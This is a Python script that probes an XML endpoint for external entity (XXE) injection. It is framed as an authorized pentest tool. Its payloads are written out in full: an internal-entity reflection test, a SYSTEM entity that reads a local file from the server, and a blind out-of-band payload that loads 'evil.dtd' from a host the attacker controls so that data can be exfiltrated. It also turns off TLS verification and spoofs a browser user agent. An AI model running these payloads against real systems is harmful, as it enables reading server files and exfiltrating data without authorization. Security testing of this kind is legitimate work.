#!/usr/bin/env python3
"""
xxe_probe.py — authorized XXE prober for an XML endpoint.

Sends, in order: (1) a malformed-XML test (is it parsed?), (2) a BENIGN internal-entity reflection test (does it expand
+ reflect entities?), (3) an in-band file read of a benign file, and (4) a blind-OOB payload pointing at your DTD host.
It reports reflection, XML-parser error signatures, and response deltas — a LEAD you confirm by hand.

Discipline: benign file first; a hit is a finding only once you retrieve real file contents / an OOB callback (§16).
Use --oob with oob_server.py running to test blind. Authorized targets only.

Usage:
  python3 xxe_probe.py -u https://target/api/xml                       # sends XML body
  python3 xxe_probe.py -u https://target/api/thing --ctype application/xml --oob YOUR-HOST:8000
  python3 xxe_probe.py -u https://target/upload --field xml            # put XML in a form field named 'xml'
"""
import argparse, re, sys
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"
MARK = "x8bitXXEmarker"
BENIGN = "file:///etc/hostname"

ERR_SIGS = [r"DOCTYPE is not allowed", r"external entity", r"XMLParseError", r"SAXParseException",
            r"lxml\.etree", r"xmlParseEntityRef", r"failed to load external entity", r"Start tag expected",
            r"org\.xml\.sax", r"System ID", r"EntityRef", r"undefined entity", r"premature end of data"]
ERR_RE = re.compile("|".join(ERR_SIGS), re.I)

MALFORMED = '<?xml version="1.0"?><r>unclosed'
INTERNAL = f'<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY t "{MARK}"> ]>\n<r>&t;</r>'
FILEREAD = f'<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "{BENIGN}"> ]>\n<r>&xxe;</r>'


def send(url, xml, ctype, field, timeout):
    h = {"User-Agent": UA}
    try:
        if field:
            return requests.post(url, data={field: xml}, headers=h, timeout=timeout, verify=False)
        h["Content-Type"] = ctype
        return requests.post(url, data=xml.encode(), headers=h, timeout=timeout, verify=False)
    except Exception as e:
        print(f"   [!] request error: {e}")
        return None


def report(label, r):
    if r is None:
        return ""
    err = ERR_RE.search(r.text)
    tag = ""
    if MARK in r.text:
        tag += "  [ENTITY REFLECTED] ⭐ internal entity expanded → in-band; try file read"
    if "root:x:0:0" in r.text or re.search(r"^[^\r\n]*:[x*]:\d+:\d+:", r.text, re.M):
        tag += "  [FILE READ] ⭐⭐ /etc/passwd-style content in response!"
    if err:
        tag += f"  [XML-ERROR ~{err.group(0)!r}] parser reached (maybe error-based)"
    print(f"   {label:22} status={r.status_code} len={len(r.text)}{tag}")
    return tag


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--ctype", default="application/xml", help="Content-Type for the XML body (default application/xml)")
    ap.add_argument("--field", help="form field name to place XML in (for multipart/form uploads)")
    ap.add_argument("--oob", help="your oob_server host:port (adds a blind-OOB test)")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()

    print(f"[*] probing {a.url}  (ctype={a.ctype}{', field='+a.field if a.field else ''})\n")
    report("malformed-xml", send(a.url, MALFORMED, a.ctype, a.field, a.timeout))
    report("internal-entity", send(a.url, INTERNAL, a.ctype, a.field, a.timeout))
    report("file-read(benign)", send(a.url, FILEREAD, a.ctype, a.field, a.timeout))

    if a.oob:
        oob_xml = (f'<?xml version="1.0"?>\n'
                   f'<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://{a.oob}/evil.dtd"> %ext; ]>\n<r>trigger</r>')
        report("blind-oob", send(a.url, oob_xml, a.ctype, a.field, a.timeout))
        print(f"\n[*] blind-OOB sent — WATCH oob_server.py on {a.oob} for a [dtd]/[EXFIL]/[hit] line.")

    print("\n[!] LEADS only. A finding = real file contents in the response OR an OOB callback in oob_server.py. "
          "Read benign first, bound reads, clean up (§16/§19).")


if __name__ == "__main__":
    main()
